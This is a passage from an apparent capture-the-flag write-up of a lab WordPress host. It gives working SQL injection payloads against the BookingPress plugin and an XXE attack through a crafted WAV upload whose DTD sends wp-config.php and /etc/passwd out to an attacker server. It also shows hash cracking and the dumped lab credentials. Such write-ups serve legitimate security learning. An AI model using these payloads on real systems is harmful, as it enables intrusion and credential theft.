SQL injection based on a UNION QUERY. Also, we know the query is on a table with 9 columns, being the seventh one the injectable. </p> <p>We could have also used the Repeater module in Burp Suite and sent a request for 9 columns and for 10 columns (I will only paste the payload):</p> <pre><code># payload of 9 columns. In case of an empty response, the table would have 8 columns.\n\naction=bookingpress_front_get_category_services&amp;_wpnonce=da775e35c6&amp;category_id=33&amp;total_service=9)+OR+1=1+order+by+9;--+-\n\n# payload of 10 columns. In case of an empty response, the table would have 9 columns.\n\naction=bookingpress_front_get_category_services&amp;_wpnonce=da775e35c6&amp;category_id=33&amp;total_service=9)+OR+1=1+order+by+10;--+-\n</code></pre> <p>Since we have an empty response with 10 columns we can conclude that the table has 9 columns. </p> <p>To get which columns are being displayed, use this payload:</p> <pre><code>action=bookingpress_front_get_category_services&amp;_wpnonce=da775e35c6&amp;category_id=33&amp;total_service=9)+UNION+SELECT+all+1,2,3,4,5,6,7,8,9;--+-\n</code></pre> <p>In the body of the response, we obtain:</p> <pre><code>[{\"bookingpress_service_id\":\"1\",\"bookingpress_category_id\":\"2\",\"bookingpress_service_name\":\"3\",\"bookingpress_service_price\":\"$4.00\",\"bookingpress_service_duration_val\":\"5\",\"bookingpress_service_duration_unit\":\"6\",\"bookingpress_service_description\":\"7\",\"bookingpress_service_position\":\"8\",\"bookingpress_servicedate_created\":\"9\",\"service_price_without_currency\":4,\"img_url\":\"http:\\/\\/metapress.htb\\/wp-content\\/plugins\\/bookingpress-appointment-booking\\/images\\/placeholder-img.jpg\"}]\n</code></pre> <p>All of the columns are being displayed, and this makes sense since it is a UNION query.</p> <p>Now we are ready to perfom our attack using Burpsuite. These would be the succesive payloads:</p> <pre><code># 1. Get the names of the databases:\n\naction=bookingpress_front_get_category_services&amp;_wpnonce=da775e35c6&amp;category_id=33&amp;total_service=9)+UNION+SELECT+table_schema,null,null,null,null,null,null,null,null+FROM+information_schema.tables;--+-\n\n# Body of the response:\n\n[{\"bookingpress_service_id\":\"information_schema\",\"bookingpress_category_id\":null,\"bookingpress_service_name\":null,\"bookingpress_service_price\":\"$0.00\",\"bookingpress_service_duration_val\":null,\"bookingpress_service_duration_unit\":null,\"bookingpress_service_description\":null,\"bookingpress_service_position\":null,\"bookingpress_servicedate_created\":null,\"service_price_without_currency\":0,\"img_url\":\"http:\\/\\/metapress.htb\\/wp-content\\/plugins\\/bookingpress-appointment-booking\\/images\\/placeholder-img.jpg\"},{\"bookingpress_service_id\":\"blog\",\"bookingpress_category_id\":null,\"bookingpress_service_name\":null,\"bookingpress_service_price\":\"$0.00\",\"bookingpress_service_duration_val\":null,\"bookingpress_service_duration_unit\":null,\"bookingpress_service_description\":null,\"bookingpress_service_position\":null,\"bookingpress_servicedate_created\":null,\"service_price_without_currency\":0,\"img_url\":\"http:\\/\\/metapress.htb\\/wp-content\\/plugins\\/bookingpress-appointment-booking\\/images\\/placeholder-img.jpg\"}]\n\n# 2. Get the names of all tables from the selected database:\n\naction=bookingpress_front_get_category_services&amp;_wpnonce=da775e35c6&amp;category_id=33&amp;total_service=9)+UNION+SELECT+table_name,null,null,null,null,null,null,null,null+FROM+information_schema.tables+WHERE+table_schema=blog;--+-\n\n# But since we are having some issues when using \"WHERE\" we will dump the database. \n\naction=bookingpress_front_get_category_services&amp;_wpnonce=da775e35c6&amp;category_id=33&amp;total_service=9)+UNION+SELECT+null,null,null,null,null,null,null,null,table_name+FROM+information_Schema.tables;--+-\n\n# This will give us an extended response from where we need to read and select the interesting table. We will use filters in BurpSuite to locate all results related to USERS. And, as matter of fact we can locate a specific table (the common one in WordPress, by the way): wp_users. We will use this later.\n\n# 3. Get the name of all columns of a selected table from a selected database. But since we are having problems using WHERE, we will dump all columns names:\n\naction=bookingpress_front_get_category_services&amp;_wpnonce=da775e35c6&amp;category_id=33&amp;total_service=9)+UNION+SELECT+column_name,null,null,null,null,null,null,null,null+FROM+information_schema.columns;--+-\n\n# Again, the response is vast. We can use Burpsuite filter to find these two colums: user_pass and user_login\n\n# 4. Now we can query the two columns we want (user_login and user_pass) from the table wp_users:\n\naction=bookingpress_front_get_category_services&amp;_wpnonce=da775e35c6&amp;category_id=33&amp;total_service=9)+UNION+SELECT+user_login,user_pass,null,null,null,null,null,null,null+FROM+wp_users;--+-\n\n# And the body response:\n\n[{\"bookingpress_service_id\":\"admin\",\"bookingpress_category_id\":\"$P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV.\",\"bookingpress_service_name\":null,\"bookingpress_service_price\":\"$0.00\",\"bookingpress_service_duration_val\":null,\"bookingpress_service_duration_unit\":null,\"bookingpress_service_description\":null,\"bookingpress_service_position\":null,\"bookingpress_servicedate_created\":null,\"service_price_without_currency\":0,\"img_url\":\"http:\\/\\/metapress.htb\\/wp-content\\/plugins\\/bookingpress-appointment-booking\\/images\\/placeholder-img.jpg\"},{\"bookingpress_service_id\":\"manager\",\"bookingpress_category_id\":\"$P$B4aNM28N0E.tMy\\/JIcnVMZbGcU16Q70\",\"bookingpress_service_name\":null,\"bookingpress_service_price\":\"$0.00\",\"bookingpress_service_duration_val\":null,\"bookingpress_service_duration_unit\":null,\"bookingpress_service_description\":null,\"bookingpress_service_position\":null,\"bookingpress_servicedate_created\":null,\"service_price_without_currency\":0,\"img_url\":\"http:\\/\\/metapress.htb\\/wp-content\\/plugins\\/bookingpress-appointment-booking\\/images\\/placeholder-img.jpg\"}]\n</code></pre> <p>Same results:</p> user_login user_pass admin $P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV. manager $P$B4aNM28N0E.tMy\\/JIcnVMZbGcU16Q70 <p>We are going to use the tool JohnTheRipper and the dictionary rockyou.txt to crack the hash.</p> <p>Let's first create the file book.hash with the hashes we just found.</p> <pre><code>nano book.hash\n</code></pre> <p>We copy paste the hashes in different lines:</p> <p>``` $P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV. $P$B4aNM28N0E.tMy\\/JIcnVMZbGcU16Q70 <pre><code>Press CTRL-X and enter Yes.\n\nNow run johntheripper:\n\n\n```bash\njohn -w=/usr/share/wordlists/rockyou.txt book.hash \n</code></pre></p> <p>Results:</p> <pre><code>\n</code></pre> <p>Log in into http://metapress.htb/wp-admin with the credentials of manager. After doing so, we realize that manager is a limited user. It does not have admin rights, ok, but the user manager can upload media.</p> <p>After a little bit of research (reading documentation from wpscan.com we can see that it exists a specific vulnerability for:</p> <ul> <li>a logged user who has enabled media uploading.</li> <li>wordpress version 5.6.2</li> <li>PHP version 8</li> </ul> <p>Since, our user falls into those parameters let's going to read a little bit more about that vulnerability. Read here. Quoting:</p> <p>Description: A user with the ability to upload files (like an Author) can exploit an XML parsing issue in the Media Library leading to XXE attacks. WordPress used an audio parsing library called ID3 that was affected by an XML External Entity (XXE) vulnerability affecting PHP versions 8 and above. This particular vulnerability could be triggered when parsing WAVE audio files. Researchers at security firm SonarSource discovered this XML external entity injection (XXE) security flaw in the WordPress Media Library.</p> <p>Impact: </p> <ul> <li>Arbitrary File Disclosure: The contents of any file on the host\u2019s file system could be retrieved, e.g. wp-config.php which contains sensitive data such as database credentials.</li> <li>Server-Side Request Forgery (SSRF): HTTP requests could be made on behalf of the WordPress installation. Depending on the environment, this can have a serious impact.</li> </ul> <p>This is my first XXE attack! And it's also a pending subject for me because I was asked about it in a job interview for a pentester position and I didn't know how to answer. Great! No pain. Let's get our hands dirty =)</p> <p>Wpscan provides us with a Proof Of Concept (POC):</p> <ol> <li>Create payload.wav:</li> </ol> <pre><code>RIFFXXXXWAVEBBBBiXML&lt;!DOCTYPE r [\n\n&lt;!ELEMENT r ANY &gt;\n\n&lt;!ENTITY % sp SYSTEM \"http://attacker-url.domain/xxe.dtd\"&gt;\n\n%sp;\n\n%param1;\n\n]&gt;\n\n&lt;r&gt;&amp;exfil;&lt;/r&gt;&gt;\n</code></pre> <ol> <li>Create xxe.dtd, the file we're going to serve:</li> </ol> <pre><code>&lt;!ENTITY % data SYSTEM \"php://filter/zlib.deflate/convert.base64-encode/resource=../wp-config.php\"&gt;\n\n&lt;!ENTITY % param1 \"&lt;!ENTITY exfil SYSTEM 'http://attacker-url.domain/?%data;'&gt;\"&gt;\n</code></pre> <p>My IP is 10.10.14.33 and I will be using port 1234 and \"xxe.dtd\" as the name of the file in my server, so payload.wav would be (using flag -en to encode characters):</p> <pre><code>echo -en 'RIFF\\xb8\\x00\\x00\\x00WAVEiXML\\x7b\\x00\\x00\\x00&lt;?xml version=\"1.0\"?&gt;&lt;!DOCTYPE ANY[&lt;!ENTITY % remote SYSTEM '\"'\"'http://10.10.14.33:1234/xxe.dtd'\"'\"'&gt;%remote;%init;%trick;]&gt;\\x00' &gt; payload.wav\n</code></pre> <p>And my xxe.dtd file if I want to get the /etc/password file:</p> <pre><code>&lt;&lt;!ENTITY % file SYSTEM \"php://filter/zlib.deflate/read=convert.base64-encode/resource=/etc/passwd\"&gt;\n&lt;!ENTITY % init \"&lt;!ENTITY &amp;#x25; trick SYSTEM 'http://10.10.14.33:1234/?p=%file;'&gt;\" &gt;\n</code></pre> <p>Now, in the same folder where we have saved xxe.dtd, run a php server. In my case:</p> <pre><code>php -S 10.10.14.33:1234\n</code></pre> <p>Now we are ready to upload payload.wav in http://metapress.htb/wp-admin/upload.php. After we do, in the command line from we were serving our xxe.dtd file, we can read:</p> <pre><code>10.10.11.186:39962 [404]: GET /?p=jVRNj5swEL3nV3BspUSGkGSDj22lXjaVuum9MuAFusamNiShv74zY8gmgu5WHtB8vHkezxisMS2/8BCWRZX5d1pplgpXLnIha6MBEcEaDNY5yxxAXjWmjTJFpRfovfA1LIrPg1zvABTDQo3l8jQL0hmgNny33cYbTiYbSRmai0LUEpm2fBdybxDPjXpHWQssbsejNUeVnYRlmchKycic4FUD8AdYoBDYNcYoppp8lrxSAN/DIpUSvDbBannGuhNYpN6Qe3uS0XUZFhOFKGTc5Hh7ktNYc+kxKUbx1j8mcj6fV7loBY4lRrk6aBuw5mYtspcOq4LxgAwmJXh97iCqcnjh4j3KAdpT6SJ4BGdwEFoU0noCgk2zK4t3Ik5QQIc52E4zr03AhRYttnkToXxFK/jUFasn2Rjb4r7H3rWyDj6IvK70x3HnlPnMmbmZ1OTYUn8n/XtwAkjLC5Qt9VzlP0XT0gDDIe29BEe15Sst27OxL5QLH2G45kMk+OYjQ+NqoFkul74jA+QNWiudUSdJtGt44ivtk4/Y/yCDz8zB1mnniAfuWZi8fzBX5gTfXDtBu6B7iv6lpXL+DxSGoX8NPiqwNLVkI+j1vzUes62gRv8nSZKEnvGcPyAEN0BnpTW6+iPaChneaFlmrMy7uiGuPT0j12cIBV8ghvd3rlG9+63oDFseRRE/9Mfvj8FR2rHPdy3DzGehnMRP+LltfLt2d+0aI9O9wE34hyve2RND7xT7Fw== - No such file or directory   \n</code></pre> <p>We will use PHP to decode this. Create a .php with the following code, just be sure to copy and paste the base64 returned from the WordPress server where we have 'base64here' in the example code:</p> <pre><code>&lt;?php echo zlib_decode(base64_decode('base64here')); ?&gt;\n</code></pre> <p>In my case, I will call the file code.php, and it will have the following php content:</p> <pre><code>&lt;?php echo zlib_decode(base64_decode('jVRNj5swEL3nV3BspUSGkGSDj22lXjaVuum9MuAFusamNiShv74zY8gmgu5WHtB8vHkezxisMS2/8BCWRZX5d1pplgpXLnIha6MBEcEaDNY5yxxAXjWmjTJFpRfovfA1LIrPg1zvABTDQo3l8jQL0hmgNny33cYbTiYbSRmai0LUEpm2fBdybxDPjXpHWQssbsejNUeVnYRlmchKycic4FUD8AdYoBDYNcYoppp8lrxSAN/DIpUSvDbBannGuhNYpN6Qe3uS0XUZFhOFKGTc5Hh7ktNYc+kxKUbx1j8mcj6fV7loBY4lRrk6aBuw5mYtspcOq4LxgAwmJXh97iCqcnjh4j3KAdpT6SJ4BGdwEFoU0noCgk2zK4t3Ik5QQIc52E4zr03AhRYttnkToXxFK/jUFasn2Rjb4r7H3rWyDj6IvK70x3HnlPnMmbmZ1OTYUn8n/XtwAkjLC5Qt9VzlP0XT0gDDIe29BEe15Sst27OxL5QLH2G45kMk+OYjQ+NqoFkul74jA+QNWiudUSdJtGt44ivtk4/Y/yCDz8zB1mnniAfuWZi8fzBX5gTfXDtBu6B7iv6lpXL+DxSGoX8NPiqwNLVkI+j1vzUes62gRv8nSZKEnvGcPyAEN0BnpTW6+iPaChneaFlmrMy7uiGuPT0j12cIBV8ghvd3rlG9+63oDFseRRE/9Mfvj8FR2rHPdy3DzGehnMRP+LltfLt2d+0aI9O9wE34hyve2RND7xT7Fw=='); ?&gt;\n</code></pre> <p>Give executable permission to th file code.php and execute it:</p> <pre><code>chmod +x code.php\nphp code.php\n</code></pre> <p>Results:</p> <pre><code>root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n_apt:x:100:65534::/nonexistent:/usr/sbin/nologin\nsystemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin\nsystemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin\nmessagebus:x:103:109::/nonexistent:/usr/sbin/nologin\nsshd:x:104:65534::/run/sshd:/usr/sbin/nologin\njnelson:x:1000:1000:jnelson,,,:/home/jnelson:/bin/bash\nsystemd-timesync:x:999:999:systemd Time Synchronization:/:/usr/sbin/nologin\nsystemd-coredump:x:998:998:systemd Core Dumper:/:/usr/sbin/nologin\nmysql:x:105:111:MySQL Server,,,:/nonexistent:/bin/false\nproftpd:x:106:65534::/run/proftpd:/usr/sbin/nologin\nftp:x:107:65534::/srv/ftp:/usr/sbin/nologin\n</code></pre> <p>Users with access to the bash terminal would be: root and jnelson. Noted!</p> <p>To request different content to the WordPress server, we only need to modify our xxe.dtd file and instead of \"/etc/passwd\", use a different path. Common files to check out are:</p> <ul> <li>username/.ssh/id_rsa.pub: with this, we could try to login into the ssh server.</li> <li>/etc/shadow: to extract hashes.</li> <li>In a WordPress server: wp-config.php: inhere you could find some credentials.</li> <li>Logs and more...</li> </ul> <p>Let's start with wp-config.php. We know from previous scans that the WordPress installation is running on a nginx server. Also, we know that wp-cofig.php file is always located at the root of the WordPress installation. Reading at the documentation, we can see that nginx server has a file that displays the enabled sites and provides an absolute path to them. That file is \"/etc/nginx/sites-enabled/default\". So, with that in mind, we can craft our xxe-nginx.dtd file with this content:</p> <pre><code>&lt;!ENTITY % file SYSTEM \"php://filter/zlib.deflate/read=convert.base64-encode/resource=/etc/nginx/sites-enabled/default\"&gt;\n&lt;!ENTITY % init \"&lt;!ENTITY &amp;#x25; trick SYSTEM 'http://10.10.14.33:1234/?p=%file;'&gt;\" &gt;\n</code></pre> <p>And for our payload-nginx.wav, we run:</p> <pre><code>echo -en 'RIFF\\xb8\\x00\\x00\\x00WAVEiXML\\x7b\\x00\\x00\\x00&lt;?xml version=\"1.0\"?&gt;&lt;!DOCTYPE ANY[&lt;!ENTITY % remote SYSTEM '\"'\"'http://10.10.14.33:1234/xxe-nginx.dtd'\"'\"'&gt;%remote;%init;%trick;]&gt;\\x00' &gt; payload.wav\n</code></pre> <p>Now, we start our php server:</p> <pre><code>php -S 10.10.14.33:1234\n</code></pre> <p>After uploading payload-nginx-wav from http://metapress.htb/wp-admin/upload.php, our php server will display:</p> <pre><code>10.10.11.186:45010 [404]: GET /?p=XVHbbsMgDH1OvsKr8tBOauhjlWrah+wSUQrEXQIIkaMLHN8zjGQ9Cfp4SfPsxYpSAPbze5Wv1XVR5UaeeatDcBO3LNhGFgnA3deEpVN2LN9a3XCoDnIEeazdI27Vk3o2ngL10AFy6IJwdWNTfwEF4OHoOET0iTFXswsLsNnNMiVvCA1gCLTFkW/HetsJUERe9xPhiwm8vXgntNcefzTHI3/gvvCVDMLGhE2x8kkEHnZCCmOAWhcR0J4Le4FjNL+Z7wyIs5bbcrJXrSrLia9a813uOgssjTYJockZPR5dS6kmjmlDYiU56dbEjR4dxfej4mITjB9TGhlrZ3hzAKnXhPud/ - or directory\n</code></pre> <p>With this code, we craft the file code-nginx.php and give it execution permissions:</p> <pre><code>nano code-nginx.php\n</code></pre> <p>The content of the file will be:</p> <pre><code>&lt;?php echo zlib_decode(base64_decode('XVHbbsMgDH1OvsKr8tBOauhjlWrah+wSUQrEXQIIkybT0n37IK2qrpaMLHN8zjGQ9Cfp4SfPsxYpSAPbze5Wv1XVR5UaeeatDcBO3LNhGFgnA3deEpVN2LN9a3XCoDnIEeazdI27Vk3o2ngL10AFy6IJwdWNpQBPL7D4x7ZYRTfwEF4OHoOET0iTFXswsLsNnNMiVvCA1gCLTFkW/HetsJUERe9xPhiwm8vXgntNcefzTHI3/gvvCVDMLGhE2x8kkEHnZCCmOAWhcR0RpbBGRYbs2qsdJ4Le4FjNL+Z7wyIs5bbcrJXrSrLia9a813uOgssjTYJockZPR5dS6kmjmlDYiU56dbEjR4dxfej4mITjB9TGhlrZ3hzAKnXhPud/')); ?&gt;\n</code></pre> <p>Then we run:</p> <pre><code>php code-nginx.php\n</code></pre> <p>Results:</p> <pre><code>server {\n\n        listen 80;\n        listen [::]:80;\n\n        root /var/www/metapress.htb/blog;\n\n        index index.php index.html;\n\n        if ($http_host != \"metapress.htb\") {\n                rewrite ^ http://metapress.htb/;\n        }\n\n        location / {\n                try_files $uri $uri/ /index.php?$args;\n        }\n\n        location ~ \\.php$ {\n                include snippets/fastcgi-php.conf;\n                fastcgi_pass unix:/var/run/php/php8.0-fpm.sock;\n        }\n\n        location ~* \\.(js|css|png|jpg|jpeg|gif|ico|svg)$ {\n                expires max;\n                log_not_found off;\n        }\n\n}\n</code></pre> <p>Nice, now we know that root is set to \"/var/www/metapress.htb/blog\" (line 6 of the code). With this, we also know wp-config.php file's location (/var/www/metapress.htb/blog/wp-config.php. </p> <p>Following previous steps, now we need to craft:</p> <ul> <li>payload-wpconfig.wav file: to upload it to http://metapress.htb/wp-admin/upload.php.</li> <li>xxe-wpconfig.dtd file: that we will serve with a php server.</li> </ul> <p>Let's craft xxe-wpconfig.dtd:</p> <pre><code>NTITY % file SYSTEM \"php://filter/zlib.deflate/read=convert.base64-encode/resource=/var/www/metapress.htb/blog/wp-config.php\"&gt;\n&lt;!ENTITY % init \"&lt;!ENTITY &amp;#x25; trick SYSTEM 'http://10.10.14.33:1234/?p=%file;'&gt;\" &gt;\n</code></pre> <p>Now, craft the payload-wpconfig.wav file:</p> <pre><code>echo -en 'RIFF\\xb8\\x00\\x00\\x00WAVEiXML\\x7b\\x00\\x00\\x00&lt;?xml version=\"1.0\"?&gt;&lt;!DOCTYPE ANY[&lt;!ENTITY % remote SYSTEM '\"'\"'http://10.10.14.33:1234/xxe-wpconfig.dtd'\"'\"'&gt;%remote;%init;%trick;]&gt;\\x00' &gt; payload-wpconfig.wav\n</code></pre> <p>Launch the php server from the folder where we want to share the file xxe-wpconfig.dtd:</p> <pre><code>php -S 10.10.14.33:1234\n</code></pre> <p>After uploading our payload-wpconfig.wav file from http://metapress.htb/wp-admin/upload.php, we can read from the command line from where we launched the php server:</p> <pre><code>10.10.11.186:57388 [404]: GET /?p=jVVZU/JKEH2+VvkfhhKMoARUQBARAoRNIEDCpgUhIRMSzEYyYVP87TdBBD71LvAANdNzTs/p6dMPaUMyTk9CgQBgJAg0ToVAFwFy/gsc4njOgkDUTdDVTaFhQssCgdDpiQBFWYMXAMtn2TpRI7ErgPGKPsGAP3l68glXW9HN6gHEtqC5Rf9+vk2Trf9x3uAsa+Ek8eN8g6DpLtXKuxix2ygxyzDCzMwteoX28088SbfQr2mUKJpxIRR9zClu1PHZ/FcWOYkzLYgA0t0LAVkDYxNySNYmh0ydHwVa+A+GXIlo0eSWxEZiXOUjxxSu+gcaXVE45ECtDIiDvK5hCIwlTps4S5JsAVl0qQXd5tEvPFS1SjDbmnwR7LcLNFsjmRK1VUtEBlzu7nmIYBr7kqgQcYZbdFxC/C9xrvRuXKLep1lZzhRWVdaI1m7q88ov0V8KO7T4fyFnCXr/qEK/7NN01dkWOcURa6/hWeby9AQEAGE7z1dD8tgpjK6BtibPbAie4MoCnCYAmlOQhW8jM5asjSG4wWN42F04VpJoMyX2iew7PF8fLO159tpFKkDElhQZXV4ZC9iIyIF1Uh2948/3vYy/2WoWeq+51kq524zMXqeYugXa4+WtmsazoftvN6HJXLtFssdM2NIre/18eMBfj20jGbkb9Ts2F6qUZr5AvE3EJoMwv9DJ7n3imnxOSAOzq3RmvnIzFjPEt9SA832jqFLFIplny/XDVbDKpbrMcY3I+mGCxxpDNFrL80dB2JCk7IvEfRWtNRve1KYFWUba2bl2WerNB+/v5GXhI/c2e+qtvlHUqXqO/FMpjFZh3vR6qfBUTg4Tg8Doo1iHHqOXyc+7fERNkEIqL1zgZnD2NlxfFNL+O3VZb08S8RhqUndU9BvFViGaqDJHFC9JJjsZh65qZ34hKr6UAmgSDcsik36e49HuMjVSMnNvcF4KPHzchwfWRng4ryXxq2V4/dF6vPXk/6UWOybscdQhrJinmIhGhYqV9lKRtTrCm0lOnXaHdsV8Za+DQvmCnrYooftCn3/oqlwaTju59E2wnC7j/1iL/VWwyItID289KV+6VNaNmvE66fP6Kh6cKkN5UFts+kD4qKfOhxWrPKr5CxWmQnbKflA/q1OyUBZTv9biD6Uw3Gqf55qZckuRAJWMcpbSvyzM4s2uBOn6Uoh14Nlm4cnOrqRNJzF9ol+ZojX39SPR60K8muKrRy61bZrDKNj7FeNaHnAaWpSX+K6RvFsfZD8XQQpgC4PF/gAqOHNFgHOo6AY0rfsjYAHy9mTiuqqqC3DXq4qsvQIJIcO6D4XcUfBpILo5CVm2YegmCnGm0/UKDO3PB2UtuA8NfW/xboPNk9l28aeVAIK3dMVG7txBkmv37kQ8SlA24Rjp5urTfh0/vgAe8AksuA82SzcIpuRI53zfTk/+Ojzl3c4VYNl8ucWyAAfYzuI2X+w0RBawjSPCuTN3tu7lGJZiC1AAoryfMiac2U5CrO6a2Y7AhV0YQWdYudPJwp0x76r/Nw== - No such file or directory\n</code></pre> <p>With this, prepare the php file code-wpconfig.php to execute and extract the content. The content of the code-wpconfig.php file would be:</p> <pre><code>&lt;?php echo zlib_decode(base64_decode('jVVZU/JKEH2+VvkfhhKMoARUQBARAoRNIEDCpgUhIRMSzEYyYVP87TdBBD71LvAANdNzTs/p6dMPaUMyTk9CgQBgJAg0ToVAFwFy/gsc4njOgkDUTdDVTaFhQssCgdDpiQBFWYMXAMtn2TpRI7ErgPGKPsGAP3l68glXW9HN6gHEtqC5Rf9+vk2Trf9x3uAsa+Ek8eN8g6DpLtXKuxix2ygxyzDCzMwteoX28088SbfQr2mUKJpxIRR9zClu1PHZ/FcWOYkzLYgA0t0LAVkDYxNySNYmh0ydHwVa+A+GXIlo0eSWxEZiXOUjxxSu+gcaXVE45ECtDIiDvK5hCIwlTps4S5JsAVl0qQXd5tEvPFS1SjDbmnwR7LcLNFsjmRK1VUtEBlzu7nmIYBr7kqgQcYZbdFxC/C9xrvRuXKLep1lZzhRWVdaI1m7q88ov0V8KO7T4fyFnCXr/qEK/7NN01dkWOcURa6/hWeby9AQEAGE7z1dD8tgpjK6BtibPbAie4MoCnCYAmlOQhW8jM5asjSG4wWN42F04VpJoMyX2iew7PF8fLO159tpFKkDElhQZXV4ZC9iIyIF1Uh2948/3vYy/2WoWeq+51kq524zMXqeYugXa4+WtmsazoftvN6HJXLtFssdM2NIre/18eMBfj20jGbkb9Ts2F6qUZr5AvE3EJoMwv9DJ7n3imnxOSAOzq3RmvnIzFjPEt9SA832jqFLFIplny/XDVbDKpbrMcY3I+mGCxxpDNFrL80dB2JCk7IvEfRWtNRve1KYFWUba2bl2WerNB+/v5GXhI/c2e+qtvlHUqXqO/FMpjFZh3vR6qfBUTg4Tg8Doo1iHHqOXyc+7fERNkEIqL1zgZnD2NlxfFNL+O3VZb08S8RhqUndU9BvFViGaqDJHFC9JJjsZh65qZ34hKr6UAmgSDcsik36e49HuMjVSMnNvcF4KPHzchwfWRng4ryXxq2V4/dF6vPXk/6UWOybscdQhrJinmIhGhYqV9lKRtTrCm0lOnXaHdsV8Za+DQvmCnrYooftCn3/oqlwaTju59E2wnC7j/1iL/VWwyItID289KV+6VNaNmvE66fP6Kh6cKkN5UFts+kD4qKfOhxWrPKr5CxWmQnbKflA/q1OyUBZTv9biD6Uw3Gqf55qZckuRAJWMcpbSvyzM4s2uBOn6Uoh14Nlm4cnOrqRNJzF9ol+ZojX39SPR60K8muKrRy61bZrDKNj7FeNaHnAaWpSX+K6RvFsfZD8XQQpgC4PF/gAqOHNFgHOo6AY0rfsjYAHy9mTiuqqqC3DXq4qsvQIJIcO6D4XcUfBpILo5CVm2YegmCnGm0/UKDO3PB2UtuA8NfW/xboPNk9l28aeVAIK3dMVG7txBkmv37kQ8SlA24Rjp5urTfh0/vgAe8AksuA82SzcIpuRI53zfTk/+Ojzl3c4VYNl8ucWyAAfYzuI2X+w0RBawjSPCuTN3tu7lGJZiC1AAoryfMiac2U5CrO6a2Y7AhV0YQWdYudPJwp0x76r/Nw==')); ?&gt;\n</code></pre> <p>Run:</p> <pre><code>php code-wpconfig.php\n</code></pre> <p>Results are the content of the wp-config.php file of the wordpress installation:</p> <pre><code>&lt;?php\n/** The name of the database for WordPress */\ndefine( 'DB_NAME', 'blog' );\n\n/** MySQL database username */\ndefine( 'DB_USER', 'blog' );\n\n/** MySQL database password */\ndefine( 'DB_PASSWORD', '635Aq@TdqrCwXFUZ' );\n\n/** MySQL hostname */\ndefine( 'DB_HOST', 'localhost' );\n\n/** Database Charset to use in creating database tables. */\ndefine( 'DB_CHARSET', 'utf8mb4' );\n\n/** The Database Collate type. Don't change this if in doubt. */\ndefine( 'DB_COLLATE', '' );\n\ndefine( 'FS_METHOD', 'ftpext' );\ndefine( 'FTP_USER', 'metapress.htb' );\ndefine( 'FTP_PASS', '9NYS_ii@FyL_p5M2NvJ' );\ndefine( 'FTP_HOST', 'ftp.metapress.htb' );\ndefine( 'FTP_BASE', 'blog/' );\ndefine( 'FTP_SSL', false );\n\n/**#@+\n * Authentication Unique Keys and Salts.\n * @since 2.6.0\n */\ndefine( 'AUTH_KEY',         '?!Z$uGO*A6xOE5x,pweP4i*z;m`|.Z:X@)QRQFXkCRyl7}`rXVG=3 n&gt;+3m?.B/:' );\ndefine( 'SECURE_AUTH_KEY',  'x$i$)b0]b1cup;47`YVua/JHq%*8UA6g]0bwoEW:91EZ9h]rWlVq%IQ66pf{=]a%' );\ndefine( 'LOGGED_IN_KEY',    'J+mxCaP4z&lt;g.6P^t`ziv&gt;dd}EEi%48%JnRq^2MjFiitn#&amp;n+HXv]||E+F~C{qKXy' );\ndefine( 'NONCE_KEY',        'SmeDr$$O0ji;^9]*`~GNe!pX@DvWb4m9Ed=Dd(.r-q{^z(F?)7mxNUg986tQO7O5' );\ndefine( 'AUTH_SALT',        '[;TBgc/,M#)d5f[H*tg50ifT?Zv.5Wx=`l@v$-vH*&lt;~:0]s}d&lt;&amp;M;.,x0z~R&gt;3!D' );\ndefine( 'SECURE_AUTH_SALT', '&gt;`VAs6!G955dJs?$O4zm`.Q;amjW^uJrk_1-dI(SjROdW[S&amp;~omiH^jVC?2-I?I.' );\ndefine( 'LOGGED_IN_SALT',   '4[fS^3!=%?HIopMpkgYboy8-jl^i]Mw}Y d~N=&amp;^JsI`M)FJTJEVI) N#NOidIf=' );\ndefine( 'NONCE_SALT',       '.sU&amp;CQ@IRlh O;5aslY+Fq8QWheSNxd6Ve#}w!Bq,h}V9jKSkTGsv%Y451F8L=bL' );\n\n/**\n * WordPress Database Table prefix.\n */\n$table_prefix = 'wp_';\n\n/**\n * For developers: WordPress debugging mode.\n * @link https://wordpress.org/support/article/debugging-in-wordpress/\n */\ndefine( 'WP_DEBUG', false );\n\n/** Absolute path to the WordPress directory. */\nif ( ! defined( 'ABSPATH' ) ) {\n        define( 'ABSPATH', __DIR__ . '/' );\n}\n\n/** Sets up WordPress vars and included files. */\nrequire_once ABSPATH . 'wp-settings.php';\n</code></pre> <p>Some lines are different from the regular wp-config.php file of a Wordpress installation. They also provide credentials to access an ftp server:</p> <pre><code>define( 'FS_METHOD', 'ftpext' );\ndefine( 'FTP_USER', 'metapress.htb' );\ndefine( 'FTP_PASS', '9NYS_ii@FyL_p5M2NvJ' );\ndefine( 'FTP_HOST', 'ftp.metapress.htb' );\ndefine( 'FTP_BASE', 'blog/' );\ndefine( 'FTP_SSL', false );\n</code></pre> <p>So... let's connect us to the ftp server:</p> <pre><code>ftp 10.10.11.186\n\n# After this we will be asked for out username and password.\n# Enter username: metapress.htb\n# Enter password: 9NYS_ii@FyL_p5M2NvJ\n</code></pre> <p>We can access two folders in the ftp server: blog and mailer. After browsing and inspecting the files, there is one that catches my attention: /mailer/sent_email.php. To get the file, run from the 